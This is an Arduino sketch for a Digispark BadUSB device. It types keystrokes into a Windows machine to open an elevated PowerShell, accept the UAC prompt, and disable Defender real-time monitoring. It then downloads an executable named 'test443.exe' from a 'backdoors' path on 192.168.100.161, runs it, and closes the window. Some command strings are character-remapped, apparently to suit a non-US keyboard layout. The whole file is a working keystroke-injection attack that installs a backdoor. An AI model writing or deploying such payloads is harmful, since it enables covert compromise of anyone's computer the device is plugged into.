#include "DigiKeyboard.h"
#define KEY_ESC 41
void setup() {
}

void loop() {
 int d=1000;
 // this is generally not necessary but with some older systems it seems to
 // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("windows powershell ");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ESC);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Set/MpPreference /DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$client ) new/object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("$client.DownloadFile*-http>&&192.168.100.161&backdoors&test443.exe-,-test.exe-(");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("start test.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
  DigiKeyboard.delay(50000);
}
